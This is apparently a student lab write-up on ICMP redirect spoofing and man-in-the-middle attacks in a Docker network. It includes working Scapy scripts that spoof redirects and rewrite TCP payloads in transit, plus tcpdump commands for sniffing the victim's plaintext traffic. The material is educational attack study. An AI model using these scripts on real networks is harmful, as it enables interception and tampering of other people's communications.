
# Cybersecurity Lab Writeup: ICMP Redirect and MITM Attack

**Author:** Safia Bakr 
**Date:** 12.05.2025

---

## Task 1: Network Setup and Verification

### Goal
Deploy a simulated network with Docker containers and verify that the victim's traffic is routed through the legitimate router.

### Network Topology
- `csl-victim`: 10.9.0.5 (target machine)
- `csl-router`: 10.9.0.11 (legit router) ↔ 192.168.60.11
- `csl-malicious-router`: 10.9.0.111 (attacker)
- `csl-attacker`: 10.9.0.105
- `csl-host-5`: 192.168.60.5 (target host/server)
- `csl-host-6`: 192.168.60.6

### Commands Used
```bash
# Start the lab
docker compose up

# Access the victim container
docker exec -it csl-victim bash

# Check IP and route
ip a
ip route

# Test route to remote host
mtr -n 192.168.60.5
```

### Output
`mtr` showed traffic flowing through `10.9.0.11`, confirming the default route is via the legitimate router.

---

## Task 2: ICMP Redirect Attack

### Goal
Spoof an ICMP redirect packet from the legitimate router to the victim, tricking it into rerouting traffic through the malicious router.

### Python Script: `icmp_spoofer.py`
```python
#!/usr/bin/env python3
from scapy.all import *
import time

# Target configuration
victim_ip = "10.9.0.5"
legit_router_ip = "10.9.0.11"
malicious_router_ip = "10.9.0.111"
target_ip = "192.168.60.5"

# ICMP redirect packet construction
ip = IP(src=legit_router_ip, dst=victim_ip)
icmp = ICMP(type=5, code=1, gw=malicious_router_ip)
original = IP(src=victim_ip, dst=target_ip)

# Final packet: IP / ICMP / Original IP / dummy ICMP
packet = ip / icmp / original / ICMP()

# Send redirect every second
try:
    while True:
        send(packet)
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Stopped.")
```

### Code Explanation
- **ICMP Type 5, Code 1**: Indicates host-specific redirect.
- **`gw=malicious_router_ip`**: Tells victim to send traffic to attacker.
- **`original`**: Spoofs the original IP header of victim's connection.
- **`send(packet)`**: Sends a crafted packet every second to ensure the victim accepts it.

### Run it on attacker:
```bash
docker exec -it csl-attacker bash
python3 /volumes/icmp_spoofer.py
```

### Verification
On victim:
```bash
mtr -n 192.168.60.5
```
You should now see traffic routed through `10.9.0.111`.

---

## Task 3: Passive Sniffing

### Goal
Capture the victim’s plaintext TCP messages after they are rerouted through the malicious router.

### Commands Used (on `csl-malicious-router`)
```bash
docker exec -it csl-malicious-router bash

# Capture full payloads in ASCII for analysis
tcpdump -i eth0 -nn -A -s 0 tcp port 1234 and host 10.9.0.5
```

### From Victim (`csl-victim`)
```bash
nc 192.168.60.5 1234
hello
I failed!
```
### From Host(`csl-host5`)
```bash
nc -lvnp 1234
hello
I failed!
```
### Result
On `tcpdump` running on the malicious router, we could see:
```
hello
I failed!
```
Proving that we captured and viewed TCP messages. This completes the breach of confidentiality.

---

## Task 4: Message Modification

### Goal
Modify intercepted TCP packets in real-time to demonstrate a breach of **data integrity**.

### Python Script: `modifier.py`
```python
#!/usr/bin/env python3
import argparse
from scapy.all import *
import os

parser = argparse.ArgumentParser(description="MITM Packet Modifier")
parser.add_argument("-s", "--src", required=True, help="Source IP address")
parser.add_argument("-f", "--find", required=True, help="String to find")
parser.add_argument("-r", "--replace", required=True, help="Replacement string")
args = parser.parse_args()

SRC_IP = args.src
FIND = args.find.encode()
REPLACE = args.replace.encode()

if len(FIND) != len(REPLACE):
    if len(REPLACE) < len(FIND):
        REPLACE += b' ' * (len(FIND) - len(REPLACE))
        print(f"[!] NOTE: Replacement string padded with {len(FIND) - len(REPLACE)} space(s).")
    else:
        print("[!] ERROR: Replacement string too long.")
        exit(1)

os.system(f"iptables -A FORWARD -s {SRC_IP} -p tcp -m string --string \"{args.find}\" --algo kmp -j DROP")

def modify(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[IP].src == SRC_IP:
        if pkt[TCP].payload:
            raw = pkt[TCP].payload.load
            if FIND in raw:
                new_raw = raw.replace(FIND, REPLACE)
                new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst) /                           TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                              seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                              flags=pkt[TCP].flags) / new_raw
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                send(new_pkt, verbose=0)

sniff(filter=f"tcp and src host {SRC_IP} and port 1234", prn=modify, store=0)
```

### 🔍 Deep Code Explanation

- **argparse setup**: Reads command-line arguments for source IP, string to find, and replacement string.
- **FIND/REPLACE encoding**: Converts strings into bytes to match TCP payload format.
- **Padding**: Ensures replacement strings don’t change payload length (to preserve TCP integrity).
- **iptables**: Drops original packets that contain the target string, preventing duplicate delivery.
- **modify(pkt)**:
  - Checks for IP and TCP layers.
  - Verifies the packet originates from the victim.
  - Reads the raw TCP payload and performs the substitution.
  - Constructs a new packet with original headers and modified payload.
  - Deletes checksums so Scapy recalculates them correctly.
  - Sends the altered packet on the wire.
- **sniff()**: Monitors traffic in real time for TCP packets from the victim on port 1234.

### Test Result
From malicious router:
```bash
python3 modifier.py --src 10.9.0.5 -f "I failed!" -r "I passed"
``` 

From victim:
```bash
echo "I failed!" | nc 192.168.60.5 1234
```

Server receives:
```
I passed
```

This demonstrates full message modification in transit.

---

## Summary of Key Concepts

| Task | Concept Demonstrated                   | Tool(s) Used        |
|------|----------------------------------------|---------------------|
| 1    | IP routing and subnet isolation        | `ip route`, `mtr`   |
| 2    | Spoofed ICMP redirect attack (RFC 1122)| `scapy`, Python     |
| 3    | TCP traffic sniffing (passive MITM)    | `tcpdump`, `netcat` |
| 4    | Payload modification (active MITM)     | `scapy`, `iptables` |

---

**End of Writeup**